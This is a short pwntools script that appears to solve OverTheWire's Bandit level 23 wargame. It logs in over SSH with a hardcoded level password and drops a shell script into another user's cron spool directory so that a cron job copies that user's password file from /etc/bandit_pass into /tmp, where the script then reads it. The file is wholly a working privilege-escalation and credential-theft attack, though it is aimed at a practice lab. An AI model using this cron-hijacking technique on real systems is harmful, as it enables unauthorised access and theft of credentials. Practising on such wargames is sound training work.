#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
from pwnlib.util.fiddling import randoms

level = 23
user = 'bandit%s' % level
next_user = 'bandit%s' % str(level+1)
host = 'bandit.labs.overthewire.org'
password = 'jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n'
port = 2220

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

context(arch='i386', os='linux')

sh = connectToLevel()
p = sh.process("echo -e '#\!/bin/bash\ncat /etc/bandit_pass/%s > /tmp/%s_pass' > /var/spool/%s/run.sh && chmod +x /var/spool/%s/run.sh" % ( next_user, next_user, next_user, next_user ), shell=True)

print("Waiting for cronjob...")
pwnlib.replacements.sleep(30)

_sh = connectToLevel()
p = _sh.process("cat /tmp/%s_pass" % next_user, shell=True)
log.info('Flag = %s' % p.recvline())
